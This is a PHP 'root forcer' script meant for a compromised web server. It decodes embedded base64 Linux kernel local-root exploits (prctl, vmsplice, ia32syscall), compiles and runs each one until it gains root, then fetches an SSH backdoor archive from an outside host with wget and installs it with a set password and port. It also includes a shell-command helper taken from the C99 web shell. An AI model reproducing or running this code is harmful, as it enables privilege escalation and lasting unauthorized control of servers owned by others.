<?PHP
/*
	Rohit Bansal
	[B]Root Forcer
	MSN: rohitisback@gmail.com
*/
/***********************************
	       Your Config Info
***********************************/
$port 	= "21"; 		// Your port to be used if Root is obtained (for SSHdoor)
$pass 	= "root";		// Your password to be used if Root is obtained (for SSHdoor)
$dir 	= "config1";	// The folder where all exploits are stored (will be removed after root or failure)
/***********************************
	       Exploit Variables
***********************************/
$two_six = array(); // all 2.6 exploits get stored as an array for later foreach usage

//Linux 2.6.x - 2.6.11
$two_six[0] = base64_decode("");

//Linux 2.6.13 -  2.6.17
$two_six[1] = base64_decode("LyogTGludXggPj0gMi42LjEzIHByY3RsIGtlcm5lbCBleHBsb2l0DQogKg0KICogKEMpIEp1bGllbiBUSU5ORVMNCiAqDQogKiBJZiB5b3UgcmVhZCB0aGUgQ2hhbmdlbG9nIGZyb20gMi42LjEzIHlvdVwndmUgcHJvYmFibHkgc2VlbjoNCiAqICBbUEFUQ0hdIHNldHVpZCBjb3JlIGR1bXANCiAqIA0KICogVGhpcyBwYXRjaCBtYWlubHkgYWRkcyBzdWlkc2FmZSB0byBzdWlkX2R1bXBhYmxlIHN5c2N0bCBidXQgYWxzbyBhIG5ldyBwZXIgcHJvY2VzcywNCiAqIHVzZXIgc2V0YWJsZSBhcmd1bWVudCB0byBQUl9TRVRfRFVNUEFCTEUuDQogKiANCiAqIFRoaXMgZmxhdyBhbGxvd3MgdXMgdG8gY3JlYXRlIGEgcm9vdCBvd25lZCBjb3JlZHVtcCBpbnRvIGFueSBkaXJlY3RvcnkuDQogKiBUaGlzIGlzIHRyaXZpYWxseSBleHBsb2l0YWJsZS4NCiAqDQogKi8NCg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3Jlc291cmNlLmg+DQojaW5jbHVkZSA8c3lzL3ByY3RsLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHRpbWUuaD4NCg0KI2RlZmluZSBDUk9ORCBcIi9ldGMvY3Jvbi5kXCINCiNkZWZpbmUgQlVGU0laRSAyMDQ4DQoNCg0Kc3RydWN0IHJsaW1pdCBteXJsaW1pdD17UkxJTV9JTkZJTklUWSwgUkxJTV9JTkZJTklUWX07DQoNCmNoYXIJY3JvbnRlbXBsYXRlW109DQpcIiMvZXRjL2Nyb24uZC9jb3JlIHN1aWRfZHVtcGFibGUgZXhwbG9pdFxcblwiDQpcIlNIRUxMPS9iaW4vc2hcXG5cIg0KXCJQQVRIPS91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2Jpbjovc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpblxcblwiDQpcIiMlcyogKiAqICogKglyb290CSBjaG93biByb290OnJvb3QgJXMgJiYgY2htb2QgNDc1NSAlcyAmJiBybSAtcmYgJXMgJiYga2lsbCAtVVNSMSAlZFxcblwiOw0KDQpjaGFyCWNyb25zdHJpbmdbQlVGU0laRV07DQpjaGFyCWZuYW1lW0JVRlNJWkVdOw0KDQpzdHJ1Y3QgdGltZXZhbCB0ZTsNCg0Kdm9pZCBzaChpbnQgc24pIHsNCglleGVjbChmbmFtZSwgZm5hbWUsIChjaGFyICopIE5VTEwpOw0KfQ0KCQ0KDQppbnQJbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7DQoNCglpbnQgbncsIHBpZDsNCg0KCWlmIChnZXRldWlkKCkgPT0gMCkgew0KCQlwcmludGYoXCJbK10gZ2V0dGluZyByb290IHNoZWxsXFxuXCIpOw0KCQlzZXR1aWQoMCk7DQoJCXNldGdpZCgwKTsNCgkJaWYgKGV4ZWNsKFwiL2Jpbi9zaFwiLCBcIi9iaW4vc2hcIiwgKGNoYXIgKikgTlVMTCkpIHsNCgkJCXBlcnJvcihcIlstXSBleGVjbGVcIik7DQoJCQlyZXR1cm4gMTsNCgkJfQ0KCX0NCg0KCXByaW50ZihcIlxcbnByY3RsKCkgc3VpZHNhZmUgZXhwbG9pdFxcblxcbihDKSBKdWxpZW4gVElOTkVTXFxuXFxuXCIpOw0KDQoJLyogZ2V0IG91ciBmaWxlIG5hbWUgKi8NCglpZiAocmVhZGxpbmsoXCIvcHJvYy9zZWxmL2V4ZVwiLCBmbmFtZSwgc2l6ZW9mKGZuYW1lKSkgPT0gLTEpIHsNCgkJcGVycm9yKFwiWy1dIHJlYWRsaW5rXCIpOw0KCQlwcmludGYoXCJUaGlzIGlzIG5vdCBmYXRhbCwgcmV3cml0ZSB0aGUgZXhwbG9pdFxcblwiKTsNCgl9DQoNCglpZiAoc2lnbmFsKFNJR1VTUjEsIHNoKSA9PSBTSUdfRVJSKSB7DQoJCXBlcnJvcihcIlstXSBzaWduYWxcIik7DQoJCXJldHVybiAxOw0KCX0NCglwcmludGYoXCJbK10gSW5zdGFsbGVkIHNpZ25hbCBoYW5kbGVyXFxuXCIpOw0KDQoJLyogTGV0IHVzIGNyZWF0ZSBjb3JlIGZpbGVzICovDQoJc2V0cmxpbWl0KFJMSU1JVF9DT1JFLCAmbXlybGltaXQpOw0KCWlmIChjaGRpcihDUk9ORCkgPT0gLTEpIHsNCgkJcGVycm9yKFwiWy1dIGNoZGlyXCIpOw0KCQlyZXR1cm4gMTsNCgl9DQoNCgkvKiBleHBsb2l0IHRoZSBmbGF3ICovDQoJaWYgKHByY3RsKFBSX1NFVF9EVU1QQUJMRSwgMikgPT0gLTEpIHsNCgkJcGVycm9yKFwiWy1dIHBydGN0bFwiKTsNCgkJcHJpbnRmKFwiSXMgeW91IGtlcm5lbCB2ZXJzaW9uID49IDIuNi4xMyA/XFxuXCIpOw0KCQlyZXR1cm4gMTsNCgl9DQoNCglwcmludGYoXCJbK10gV2UgYXJlIHN1aWRzYWZlIGR1bXBhYmxlIVxcblwiKTsNCg0KCS8qIEZvcmdlIHRoZSBzdHJpbmcgZm9yIG91ciBjb3JlIGR1bXAgKi8NCgludz1zbnByaW50Zihjcm9uc3RyaW5nLCBzaXplb2YoY3JvbnN0cmluZyksIGNyb250ZW1wbGF0ZSwgXCJcXG5cIiwgZm5hbWUsIGZuYW1lLCBDUk9ORFwiL2NvcmVcIiwgZ2V0cGlkKCkpOw0KCWlmIChudyA+PSBzaXplb2YoY3JvbnN0cmluZykpIHsNCgkJcHJpbnRmKFwiWy1dIGNyb25zdHJpbmcgaXMgdG9vIHNtYWxsXFxuXCIpOw0KCQlyZXR1cm4gMTsNCgl9DQoJcHJpbnRmKFwiWytdIE1hbGljaW91cyBzdHJpbmcgZm9yZ2VkXFxuXCIpOw0KDQoJaWYgKChwaWQ9Zm9yaygpKSA9PSAtMSkgew0KCQlwZXJyb3IoXCJbLV0gZm9ya1wiKTsNCgkJcmV0dXJuIDE7DQoJfQ0KDQoJaWYgKHBpZCA9PSAwKSB7DQoJCS8qIFRoaXMgaXMgbm90IHRoZSBnb29kIHdheSB0byBkbyBpdCA7KSAqLw0KCQlzbGVlcCgxMjApOw0KCQlleGl0KDApOw0KCX0NCg0KCS8qIFNFR0ZBVUxUIHRoZSBjaGlsZCAqLw0KCXByaW50ZihcIlsrXSBTZWdmYXVsdGluZyBjaGlsZFxcblwiKTsNCglpZiAoa2lsbChwaWQsIDExKSA9PSAtMSkgew0KCQlwZXJyb3IoXCJbLV0ga2lsbFwiKTsNCgkJcmV0dXJuIDE7DQoJfQ0KCWlmIChnZXR0aW1lb2ZkYXkoJnRlLCBOVUxMKSA9PSAwKSANCgkJcHJpbnRmKFwiWytdIFdhaXRpbmcgZm9yIGV4cGxvaXQgdG8gc3VjY2VlZCAofiVsZCBzZWNvbmRzKVxcblwiLCA2MCAtICh0ZS50dl9zZWMlNjApKTsNCglzbGVlcCgxMjApOw0KDQoJcHJpbnRmKFwiWy1dIEl0IGxvb2tzIGxpa2UgdGhlIGV4cGxvaXQgZmFpbGVkXFxuXCIpOw0KDQoJcmV0dXJuIDE7DQp9DQo=");

//Linux 2.6.17 - 2.6.24.1
$two_six[2] = base64_decode("");

//Linux 2.6.23 - 2.6.24
$two_six[3] = base64_decode("LyoNCiAqIGRpYW5lX2xhbmVfZnVja2VkX2hhcmQuYw0KICoNCiAqIExpbnV4IHZtc3BsaWNlIExvY2FsIFJvb3QgRXhwbG9pdA0KICogQnkgcWFheg0KICoNCiAqIExpbnV4IDIuNi4yMyAtIDIuNi4yNA0KICovDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy91aW8uaD4NCg0KI2RlZmluZSBUQVJHRVRfUEFUVEVSTgkJXCIgc3lzX3ZtODZvbGRcIg0KI2RlZmluZSBUQVJHRVRfU1lTQ0FMTAkJMTEzDQoNCiNpZm5kZWYgX19OUl92bXNwbGljZQ0KI2RlZmluZSBfX05SX3Ztc3BsaWNlCQkzMTYNCiNlbmRpZg0KDQojZGVmaW5lIF92bXNwbGljZShmZCxpbyxucixmbCkJc3lzY2FsbChfX05SX3Ztc3BsaWNlLCAoZmQpLCAoaW8pLCAobnIpLCAoZmwpKQ0KI2RlZmluZSBnaW1tZXJvb3QoKQkJc3lzY2FsbChUQVJHRVRfU1lTQ0FMTCwgMzEzMzcsIGtlcm5lbF9jb2RlLCAxLCAyLCAzLCA0KQ0KDQojZGVmaW5lIFRSQU1QX0NPREUJCSh2b2lkICopIHRyYW1wb2xpbmUJDQojZGVmaW5lIFRSQU1QX1NJWkUJCSggc2l6ZW9mKHRyYW1wb2xpbmUpIC0gMSApDQoNCnVuc2lnbmVkIGNoYXIgdHJhbXBvbGluZVtdID0NClwiXFx4OGJcXHg1Y1xceDI0XFx4MDRcIgkJLyogbW92ICAgIDB4NCglZXNwKSwlZWJ4CSovDQpcIlxceDhiXFx4NGNcXHgyNFxceDA4XCIJCS8qIG1vdiAgICAweDgoJWVzcCksJWVjeAkqLw0KXCJcXHg4MVxceGZiXFx4NjlcXHg3YVxceDAwXFx4MDBcIgkvKiBjbXAgICAgJDMxMzM3LCVlYngJCSovDQpcIlxceDc1XFx4MDJcIgkJCS8qIGpuZSAgICArMgkJCSovDQpcIlxceGZmXFx4ZDFcIgkJCS8qIGNhbGwgICAqJWVjeAkJCSovDQpcIlxceGI4XFx4ZWFcXHhmZlxceGZmXFx4ZmZcIgkJLyogbW92ICAgICQtRUlOVkFMLCVlYXgJCSovDQpcIlxceGMzXCIJCQkJLyogcmV0CQkJCSovDQo7DQoNCnZvaWQJZGllKGNoYXIgKm1zZywgaW50IGVycikNCnsNCglwcmludGYoZXJyID8gXCJbLV0gJXM6ICVzXFxuXCIgOiBcIlstXSAlc1xcblwiLCBtc2csIHN0cmVycm9yKGVycikpOw0KCWZmbHVzaChzdGRvdXQpOw0KCWZmbHVzaChzdGRlcnIpOw0KCWV4aXQoMSk7DQp9DQoNCmxvbmcJZ2V0X3RhcmdldCgpDQp7DQoJRklMRQkqZjsNCglsb25nCWFkZHIgPSAwOw0KCWNoYXIJbGluZVsxMjhdOw0KDQoJZiA9IGZvcGVuKFwiL3Byb2Mva2FsbHN5bXNcIiwgXCJyXCIpOw0KCWlmICghZikgZGllKFwiL3Byb2Mva2FsbHN5bXNcIiwgZXJybm8pOw0KDQoJd2hpbGUgKGZnZXRzKGxpbmUsIHNpemVvZihsaW5lKSwgZikpIHsNCgkJaWYgKHN0cnN0cihsaW5lLCBUQVJHRVRfUEFUVEVSTikpIHsNCgkJCWFkZHIgPSBzdHJ0b3VsKGxpbmUsIE5VTEwsIDE2KTsNCgkJCWJyZWFrOw0KCQl9DQoJfQ0KDQoJZmNsb3NlKGYpOw0KCXJldHVybiBhZGRyOw0KfQ0KDQpzdGF0aWMgaW5saW5lIF9fYXR0cmlidXRlX18oKGFsd2F5c19pbmxpbmUpKQ0Kdm9pZCAqCWdldF9jdXJyZW50KCkNCnsNCgl1bnNpZ25lZCBsb25nIGN1cnI7DQoJX19hc21fXyBfX3ZvbGF0aWxlX18gKA0KCVwibW92bCAlJWVzcCwgJSVlYXggO1wiDQoJXCJhbmRsICUxLCAlJWVheCA7XCINCglcIm1vdmwgKCUlZWF4KSwgJTBcIg0KCTogXCI9clwiIChjdXJyKQ0KCTogXCJpXCIgKH44MTkxKQ0KCSk7DQoJcmV0dXJuICh2b2lkICopIGN1cnI7DQp9DQoNCnN0YXRpYyB1aW50IHVpZCwgZ2lkOw0KDQp2b2lkCWtlcm5lbF9jb2RlKCkNCnsNCglpbnQJaTsNCgl1aW50CSpwID0gZ2V0X2N1cnJlbnQoKTsNCg0KCWZvciAoaSA9IDA7IGkgPCAxMDI0LTEzOyBpKyspIHsNCgkJaWYgKHBbMF0gPT0gdWlkICYmIHBbMV0gPT0gdWlkICYmDQoJCSAgICBwWzJdID09IHVpZCAmJiBwWzNdID09IHVpZCAmJg0KCQkgICAgcFs0XSA9PSBnaWQgJiYgcFs1XSA9PSBnaWQgJiYNCgkJICAgIHBbNl0gPT0gZ2lkICYmIHBbN10gPT0gZ2lkKSB7DQoJCQlwWzBdID0gcFsxXSA9IHBbMl0gPSBwWzNdID0gMDsNCgkJCXBbNF0gPSBwWzVdID0gcFs2XSA9IHBbN10gPSAwOw0KCQkJcCA9ICh1aW50ICopICgoY2hhciAqKShwICsgOCkgKyBzaXplb2Yodm9pZCAqKSk7DQoJCQlwWzBdID0gcFsxXSA9IHBbMl0gPSB+MDsNCgkJCWJyZWFrOw0KCQl9DQoJCXArKzsNCgl9CQ0KfQ0KDQppbnQJbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCWludAkJcGlbMl07DQoJbG9uZwkJYWRkcjsNCglzdHJ1Y3QgaW92ZWMJaW92Ow0KDQoJdWlkID0gZ2V0dWlkKCk7DQoJZ2lkID0gZ2V0Z2lkKCk7DQoJc2V0cmVzdWlkKHVpZCwgdWlkLCB1aWQpOw0KCXNldHJlc2dpZChnaWQsIGdpZCwgZ2lkKTsNCg0KCXByaW50ZihcIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXFxuXCIpOw0KCXByaW50ZihcIiBMaW51eCB2bXNwbGljZSBMb2NhbCBSb290IEV4cGxvaXRcXG5cIik7DQoJcHJpbnRmKFwiIEJ5IHFhYXpcXG5cIik7DQoJcHJpbnRmKFwiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cXG5cIik7DQoNCglpZiAoIXVpZCB8fCAhZ2lkKQ0KCQlkaWUoXCIhQCMkXCIsIDApOw0KDQoJYWRkciA9IGdldF90YXJnZXQoKTsNCglwcmludGYoXCJbK10gYWRkcjogMHglbHhcXG5cIiwgYWRkcik7DQoNCglpZiAocGlwZShwaSkgPCAwKQ0KCQlkaWUoXCJwaXBlXCIsIGVycm5vKTsNCg0KCWlvdi5pb3ZfYmFzZSA9ICh2b2lkICopIGFkZHI7DQoJaW92Lmlvdl9sZW4gID0gVFJBTVBfU0laRTsNCg0KCXdyaXRlKHBpWzFdLCBUUkFNUF9DT0RFLCBUUkFNUF9TSVpFKTsNCglfdm1zcGxpY2UocGlbMF0sICZpb3YsIDEsIDApOw0KDQoJZ2ltbWVyb290KCk7DQoNCglpZiAoZ2V0dWlkKCkgIT0gMCkNCgkJZGllKFwid3RmXCIsIDApOw0KDQoJcHJpbnRmKFwiWytdIHJvb3RcXG5cIik7DQoJcHV0ZW52KFwiSElTVEZJTEU9L2Rldi9udWxsXCIpOw0KCWV4ZWNsKFwiL2Jpbi9iYXNoXCIsIFwiYmFzaFwiLCBcIi1pXCIsIE5VTEwpOw0KCWRpZShcIi9iaW4vYmFzaFwiLCBlcnJubyk7DQoJcmV0dXJuIDA7DQp9DQo=");


$two_four = array();	// all 2.4 exploits stored as an array for later foreach usage
						// All the 2.4 exploits from Milw0rm cause I'm 1337 like that 
$two_four[0] = base64_decode("");
$two_four[1] = base64_decode("");
$two_four[2] = base64_decode("");
$two_four[3] = base64_decode("LyoNCiAqIGV4cGxvaXQgZm9yIHg4Nl82NCBsaW51eCBrZXJuZWwgaWEzMnN5c2NhbGwgZW11bGF0aW9uDQogKiBidWcsIGRpc2NvdmVyZWQgYnkgV29qY2llY2ggUHVyY3p5bnNraSA8Y2xpcGhfYXRfaXNlYy5wbD4NCiAqDQogKiBieQ0KICogUm9iZXJ0IFN3aWVja2kgPHJvYmVydF9hdF9zd2llY2tpLm5ldD4NCiAqIFByemVteXNsYXcgRnJhc3VuZWsgPHZlbmdsaW5fYXRfZnJlZWJzZC5sdWJsaW4ucGw+DQogKiBQYXdlbCBQaXNhcmN6eWsgPHBhd2VsX2F0X2ltbW9zLmNvbS5wbD4NCiAqIG9mIEFUTS1MYWIgaHR0cDovL3d3dy5hdG0tbGFiLnBsDQogKi8NCg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQojaW5jbHVkZSA8c3lzL3B0cmFjZS5oPg0KI2luY2x1ZGUgPGludHR5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3JlZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCg0KdWludDMyX3QgdWlkLCBldWlkLCBzdWlkOw0KDQpzdGF0aWMgdm9pZCBrZXJuZWxtb2RlY29kZSh2b2lkKQ0Kew0KICAgICAgICBpbnQgaTsNCiAgICAgICAgdWludDhfdCAqZ3M7DQogICAgICAgIHVpbnQzMl90ICpwdHI7DQoNCiAgICAgICAgYXNtIHZvbGF0aWxlIChcXFwibW92cSAlJWdzOigweDApLCAlMFxcXCIgOiBcXFwiPXJcXFwiKGdzKSk7DQoNCiAgICAgICAgZm9yIChpID0gMjAwOyBpIDwgMTAwMDsgaSs9MSkgew0KDQogICAgICAgICAgICAgICAgcHRyID0gKHVpbnQzMl90KikgKGdzICsgaSk7DQoNCiAgICAgICAgICAgICAgICBpZiAoKHB0clswXSA9PSB1aWQpICYmIChwdHJbMV0gPT0gZXVpZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICYmIChwdHJbMl0gPT0gc3VpZCkgJiYgKHB0clszXSA9PSB1aWQpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBwdHJbMF0gPSAwOyAvL1VJRA0KICAgICAgICAgICAgICAgICAgICAgICAgcHRyWzFdID0gMDsgLy9FVUlEDQogICAgICAgICAgICAgICAgICAgICAgICBwdHJbMl0gPSAwOyAvL1NVSUQNCg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCn0NCg0Kc3RhdGljIHZvaWQgZG9jYWxsKHVpbnQ2NF90ICpwdHIsIHVpbnQ2NF90IHNpemUpDQp7DQogICAgICAgIGdldHJlc3VpZCgmdWlkLCAmZXVpZCwgJnN1aWQpOw0KDQogICAgICAgIHVpbnQ2NF90IHRtcCA9ICgodWludDY0X3QpcHRyICYgfjB4MDAwMDAwMDAwMDBGRkYpOw0KDQogICAgICAgIGlmIChtbWFwKCh2b2lkKil0bXAsIHNpemUsIFBST1RfUkVBRHxQUk9UX1dSSVRFfFBST1RfRVhFQywNCiAgICAgICAgICAgICAgICBNQVBfUFJJVkFURXxNQVBfRklYRUR8TUFQX0FOT05ZTU9VUywgLTEsIDApID09IE1BUF9GQUlMRUQpIHsNCiAgICAgICAgICAgICAgICBwcmludGYoXFxcIm1tYXAgZmF1bHRcXFxcblxcXCIpOw0KICAgICAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgIH0NCg0KICAgICAgICBmb3IgKDsgcHRyIDwgKHRtcCArIHNpemUpOyBwdHIrKykNCiAgICAgICAgICAgICAgICAqcHRyID0gKHVpbnQ2NF90KWtlcm5lbG1vZGVjb2RlOw0KDQogICAgICAgIF9fYXNtX18oXFxcIlxcXFxuXFxcIg0KICAgICAgICBcXFwiXFxcXHRtb3ZxICQweDEwMSwgJXJheFxcXFxuXFxcIg0KICAgICAgICBcXFwiXFxcXHRpbnQgJDB4ODBcXFxcblxcXCIpOw0KDQogICAgICAgIHByaW50ZihcXFwiVUlEICVkLCBFVUlEOiVkIEdJRDolZCwgRUdJRDolZFxcXFxuXFxcIiwgZ2V0dWlkKCksIGdldGV1aWQoKSwgZ2V0Z2lkKCksIGdldGVnaWQoKSk7DQogICAgICAgIGV4ZWNsKFxcXCIvYmluL3NoXFxcIiwgXFxcImJpbi9zaFxcXCIsIDApOw0KICAgICAgICBwcmludGYoXFxcIm5vIC9iaW4vc2ggPz9cXFxcblxcXCIpOw0KICAgICAgICBleGl0KDApOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDQp7DQogICAgICAgIGludCBwaWQsIHN0YXR1cywgc2V0ID0gMDsNCiAgICAgICAgdWludDY0X3QgcmF4Ow0KICAgICAgICB1aW50NjRfdCBrZXJuX3MgPSAweGZmZmZmZmZmODAwMDAwMDA7DQogICAgICAgIHVpbnQ2NF90IGtlcm5fZSA9IDB4ZmZmZmZmZmY4NDAwMDAwMDsNCiAgICAgICAgdWludDY0X3Qgb2ZmID0gMHgwMDAwMDAwODAwMDAwMTAxICogODsNCg0KICAgICAgICBpZiAoYXJnYyA9PSA0KSB7DQogICAgICAgICAgICAgICAgZG9jYWxsKCh1aW50NjRfdCopKGtlcm5fcyArIG9mZiksIGtlcm5fZSAtIGtlcm5fcyk7DQogICAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgocGlkID0gZm9yaygpKSA9PSAwKSB7DQogICAgICAgICAgICAgICAgcHRyYWNlKFBUUkFDRV9UUkFDRU1FLCAwLCAwLCAwKTsNCiAgICAgICAgICAgICAgICBleGVjbChhcmd2WzBdLCBhcmd2WzBdLCBcXFwiMlxcXCIsIFxcXCIzXFxcIiwgXFxcIjRcXFwiLCAwKTsNCiAgICAgICAgICAgICAgICBwZXJyb3IoXFxcImV4ZWMgZmF1bHRcXFwiKTsNCiAgICAgICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHBpZCA9PSAtMSkgew0KICAgICAgICAgICAgICAgIHByaW50ZihcXFwiZm9yayBmYXVsdFxcXFxuXFxcIik7DQogICAgICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGZvciAoOzspIHsNCiAgICAgICAgICAgICAgICBpZiAod2FpdCgmc3RhdHVzKSAhPSBwaWQpDQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICAgICAgICAgIGlmIChXSUZFWElURUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRmKFxcXCJQcm9jZXNzIGZpbmlzaGVkXFxcXG5cXFwiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICghV0lGU1RPUFBFRChzdGF0dXMpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQoNCiAgICAgICAgICAgICAgICBpZiAoV1NUT1BTSUcoc3RhdHVzKSAhPSBTSUdUUkFQKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoXFxcIlByb2Nlc3MgcmVjZWl2ZWQgc2lnbmFsOiAlZFxcXFxuXFxcIiwgV1NUT1BTSUcoc3RhdHVzKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICByYXggPSBwdHJhY2UoUFRSQUNFX1BFRUtVU0VSLCBwaWQsIDgqT1JJR19SQVgsIDApOw0KICAgICAgICAgICAgICAgIGlmIChyYXggPT0gMHgwMDAwMDAwMDAxMDEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwdHJhY2UoUFRSQUNFX1BPS0VVU0VSLCBwaWQsIDgqT1JJR19SQVgsIG9mZi84KSA9PSAtMSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoXFxcIlBUUkFDRV9QT0tFVVNFUiBmYXVsdFxcXFxuXFxcIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBzZXQgPSAxOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICgocmF4ID09IDExKSAmJiBzZXQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHB0cmFjZShQVFJBQ0VfREVUQUNILCBwaWQsIDAsIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yKDs7KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzbGVlcCgxMDAwMCk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKHB0cmFjZShQVFJBQ0VfU1lTQ0FMTCwgcGlkLCAxLCAwKSA9PSAtMSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRmKFxcXCJQVFJBQ0VfU1lTQ0FMTCBmYXVsdFxcXFxuXFxcIik7DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAwOw0KfQ0K");
$two_four[4] = base64_decode("");

/***********************************
		 Functions
***********************************/

function trucmd($cmd) // hap hazardly barrowed and slightly modified from C99 shell 
{
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}

function test() // compile a Hello World, see if the output is Hello World if not it won't work
{
$test = base64_decode("I2luY2x1ZGU8c3RkaW8uaD4NCg0KbWFpbigpDQp7DQogICAgcHJpbnRmKFwiSGVsbG8gV29ybGRcIik7DQoNCn0=");
	$fh = fopen("e.c", 'w') or die("can't open file");
	fwrite($fh, stripslashes($test));
	fclose($fh);
		if(trucmd("chmod 777 e.c; gcc -o new2 e.c; ./new2") != "Hello World")
		{
			echo "[!] gcc, or write access denied!";
			unlink("e.c");
			return FALSE;
		}else{
			unlink("new2");
			unlink("e.c");
			return TRUE;
		}
}

function ex_create($dir, $array) // create exploits from the array
{
$x = 1;
	if(!is_dir($dir))
	{
		mkdir($dir);
	}
		foreach($array as $exploit)
		{
			ex_write($dir, $exploit, $x);
			$x++;
		}
return $x;
}

function ex_write($dir, $data, $name) // wire exploit data
{
	$fh = fopen("./$dir/$name.c", 'w') or die("can't open file");
	fwrite($fh, stripslashes($data));
	fclose($fh);
}

function get_kern() // getting kernel version via uname -r and eregi()
{
	if(eregi('2.6',trucmd("uname -r")))
	{
		return "2.6";
	}elseif(eregi('2.4',trucmd("uname -r")))
	{
		return "2.4";
	}		
}

function clean($dir) //read the directory, delete the files, before deleting the dir
{
	$d = dir($dir);
		while($entry = $d->read())
		{
			 if ($entry!= "." && $entry!= "..") 
			 { 
				unlink("./$dir/$entry");
			 }
		}
	$d->close();
	rmdir($dir);	
}

function finish($dir, $x, $port, $pass)
{
	trucmd("./$dir/$x; wget hostfile.org/0_sshdoor.tgz; tar -zxvf sshdoor.tar.gz; cd sshdoor; ./install $pass $port");
}


function broot($dir, $max) // compile all the source, execute each one and if whoami equals root return true
{
global $port, $pass;
$max = $max -1;
	for($x=1;$x<=$max;$x++)
	{
		if(trucmd("chmod 777 ./$dir/$x.c; gcc -o ./$dir/$x ./$dir/$x.c; ./$x; whoami") == "root")
		{
			echo "[+] Rooted with ./$dir/$x <br />";
			echo "[+] Installing SSHdoor <br />";
				finish($dir, $x, $port, $pass);
				return TRUE;
		}else{
			echo "[~] Failed to root with ./$dir/$x <br />";
		}
	}
}

/***********************************
		Executed Code
***********************************/
if(test())
{
	echo "[+]Getting Kernel <br />";
		if(get_kern() == "2.6")
		{
			echo "[+] Kernel Detected 2.6 <br />";
				if(!broot($dir,ex_create($dir, $two_six)))
				{
					echo "[!] Failed to root, removing exploits & folder";
					clean($dir);
				}
		}
		else
		{
			echo "[+] Kernel Detected 2.4 <br />";
				if(!broot($dir,ex_create($dir, $two_four)))
				{
					echo "[!] Failed to root, removing exploits & folder";
					clean($dir);
				}	
		}
}
?>